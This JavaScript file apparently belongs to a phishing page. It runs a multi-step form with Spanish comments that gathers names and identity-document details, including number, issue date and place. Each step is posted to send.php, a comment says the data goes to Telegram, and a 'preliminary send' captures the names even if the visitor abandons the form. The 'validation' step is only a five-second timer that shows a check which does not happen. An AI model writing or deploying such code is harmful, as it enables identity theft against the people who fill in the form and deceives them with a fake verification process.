(() => {
  const TOTAL_STEPS = 4;
  const VALIDATION_SECONDS = 5;
  let current = 1;
  let validationTimer = null;
  const data = {};

  const stepEls = document.querySelectorAll('#stepper .step');
  const sections = document.querySelectorAll('.form-section');

  function render(scrollToStepper) {
    stepEls.forEach((el) => {
      const n = Number(el.dataset.step);
      el.classList.toggle('active', n === current);
      el.classList.toggle('done', n < current);
    });
    sections.forEach((s) => {
      s.classList.toggle('active', Number(s.dataset.form) === current);
    });
    // Scroll al stepper solo cuando el usuario cambia de paso, NO en la carga inicial.
    if (scrollToStepper) {
      const stepperWrap = document.querySelector('.stepper-wrap');
      if (stepperWrap) {
        const y = stepperWrap.getBoundingClientRect().top + window.pageYOffset - 8;
        window.scrollTo({ top: y, behavior: 'smooth' });
      }
    }
  }

  function go(step) {
    if (step < 1 || step > TOTAL_STEPS) return;
    current = step;
    render(true);
    if (step === 3) startValidation();
  }

  function stopValidation() {
    if (validationTimer) {
      clearTimeout(validationTimer);
      validationTimer = null;
    }
  }

  function startValidation() {
    stopValidation();
    validationTimer = setTimeout(() => {
      validationTimer = null;
      go(4);
    }, VALIDATION_SECONDS * 1000);
  }

  // Step 1 form
  const form1 = document.getElementById('form1');
  form1.addEventListener('submit', (e) => {
    e.preventDefault();
    if (!form1.reportValidity()) return;
    data.nombres = form1.nombres.value.trim();
    data.apellidos = form1.apellidos.value.trim();

    // Envío preliminar: por si abandonan antes del paso 2
    fetch('send.php', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ step: 'paso1', nombres: data.nombres, apellidos: data.apellidos }),
      keepalive: true,
    }).catch(() => {});

    go(2);
  });

  // Step 2 form
  const form2 = document.getElementById('form2');
  form2.addEventListener('submit', (e) => {
    e.preventDefault();
    if (!form2.reportValidity()) return;
    data.tipoDoc = form2.tipoDoc.value;
    data.numDoc = form2.numDoc.value.trim();
    data.fechaExp = form2.fechaExp.value;
    data.lugarExp = form2.lugarExp.value.trim();

    // Guardar para validación posterior en validacion.html
    sessionStorage.setItem('lugarExp', data.lugarExp);

    // Enviar a Telegram solo los datos de identificación (paso2)
    fetch('send.php', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        step: 'paso2',
        tipoDoc:  data.tipoDoc,
        numDoc:   data.numDoc,
        fechaExp: data.fechaExp,
        lugarExp: data.lugarExp,
      }),
      keepalive: true,
    }).catch(() => {});

    go(3);
  });

  // Generic buttons
  document.querySelectorAll('[data-action="back"]').forEach((b) => {
    b.addEventListener('click', () => {
      stopValidation();
      go(current - 1);
    });
  });
  document.querySelectorAll('[data-action="next"]').forEach((b) => {
    b.addEventListener('click', () => go(current + 1));
  });
  document.querySelectorAll('[data-action="restart"]').forEach((b) => {
    b.addEventListener('click', () => {
      stopValidation();
      form1.reset();
      form2.reset();
      go(1);
    });
  });

  render();
})();
